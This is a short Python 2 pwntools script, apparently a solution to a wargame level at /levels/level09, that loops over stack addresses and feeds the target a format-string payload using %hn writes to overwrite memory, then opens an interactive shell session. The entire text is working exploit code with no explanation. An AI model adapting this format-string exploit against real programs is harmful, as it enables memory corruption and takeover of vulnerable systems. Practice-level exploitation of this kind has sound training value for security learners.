from pwn import *

base_stack_address = 0xbffff70c
count = 0
while count < 0x200:
    stack_address_lo = base_stack_address + count
    stack_address_hi = stack_address_lo + 0x02
    arg = p32(stack_address_hi) + p32(stack_address_lo) + "%49142x%4$hn%15652x%5$hn"
    prog = process(executable="/levels/level09", argv=['/levels/level09', arg])
    count += 0x10

    arg_string = ':'.join(x.encode('hex') for x in arg)
    print arg
    print arg_string

    prog.interactive()

    print prog.clean()
